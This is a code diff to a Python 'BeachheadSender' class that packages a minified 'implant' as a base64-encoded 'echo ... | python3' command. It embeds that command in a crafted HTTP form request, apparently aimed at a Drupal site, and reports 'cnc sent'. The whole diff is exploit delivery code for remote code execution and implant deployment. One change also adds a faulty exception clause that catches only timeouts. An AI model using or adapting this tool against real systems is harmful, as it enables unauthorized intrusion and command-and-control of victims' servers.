@@ -1,6 +1,6 @@
 import pathlib
 import python_minifier
-import binascii
+from base64 import b64encode
 
 import requests
 
@@ -31,7 +31,7 @@ class BeachheadSender:
 
         with open(implant_file_path, "r") as f:
             filedata = python_minifier.minify(f.read())
-        return filedata
+        return 'echo "' + filedata + '" | python3'
 
     def create_request(
         self, ip_addr: str, port: str, path: str
@@ -68,8 +68,8 @@ class BeachheadSender:
             "Connection": "close",
         }
 
-        # The implant is encoded in hex to make it easier to send in the request
-        implant = binascii.hexlify(self.implant.encode("utf-8")).decode("utf-8")
+        # The implant is encoded in base64 to make it easier to send in the request
+        implant = b64encode(self.implant.encode("utf-8")).decode("utf-8")
 
         # The data from the initial request, with the implant added
         data = "title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B"
@@ -106,7 +106,7 @@ class BeachheadSender:
             s.send(prepped, verify=False, timeout=1)
             print("BEACHHEAD SENDER: cnc sent")
 
-        except requests.exceptions.ConnectionError:
+        except requests.exceptions.ConnectionError and requests.exceptions.ReadTimeout:
             pass
 
 
